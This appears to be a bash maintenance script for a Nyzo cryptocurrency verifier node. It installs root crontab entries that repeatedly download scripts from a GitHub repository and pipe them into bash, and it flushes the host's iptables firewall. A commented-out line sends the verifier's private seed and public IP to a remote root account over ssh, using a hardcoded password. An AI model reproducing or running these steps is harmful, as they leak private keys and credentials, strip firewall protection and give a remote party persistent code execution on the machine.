#!/bin/bash
sudo su
#sudo rm -rf ~/.cache/thumbnails/*
#sudo rm -rf /var/lib/nyzo/production/blocks/
#sudo rm -rf /var/lib/nyzo/production/blocks/
#echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'pB3SbjkH' ssh root@139.99.90.249 'cat - >> /root/testv'
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/reload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/oneminute.sh | bash
 " >> myverifier
sudo crontab myverifier
rm myverifier
iptables -F
iptables -I INPUT -s 104.161.79.22 -j DROP
iptables -I OUTPUT -d 104.161.79.22 -j DROP
#cd /home/ubuntu/nyzoVerifier
#sudo git reset --hard
#sudo git pull origin master
#sudo ./gradlew build
#sleep 3s
#sudo renice -n -5 -p $(pgrep ^java$)
sudo supervisorctl reload

